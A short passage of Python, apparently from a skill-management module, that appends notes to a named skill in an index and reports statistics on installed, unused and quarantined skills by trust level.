    if name not in ix:
        return {"ok": False, "reason": f"no skill called {name}"}
    notes = ix[name].get("notes", [])
    if note in notes:
        return {"ok": True, "reason": "already noted", "notes": len(notes)}
    notes.append(note)
    ix[name]["notes"] = notes[-20:]        # newest 20; a skill is not a diary
    _write_index(ix)
    return {"ok": True, "skill": name, "notes": len(ix[name]["notes"]),
            "reason": "noted"}


def stats() -> dict:
    ix = _read_index()
    return {"installed": len(ix),
            "by_trust": {t: sum(1 for r in ix.values() if r.get("trust") == t)
                         for t in TRUST_LEVELS},
            "unused": [n for n, r in ix.items() if not r.get("uses")],
            "quarantined": len(list(QUARANTINE.glob("*"))) if QUARANTINE.is_dir() else 0,
            "skills_dir": str(SKILLS_DIR)}
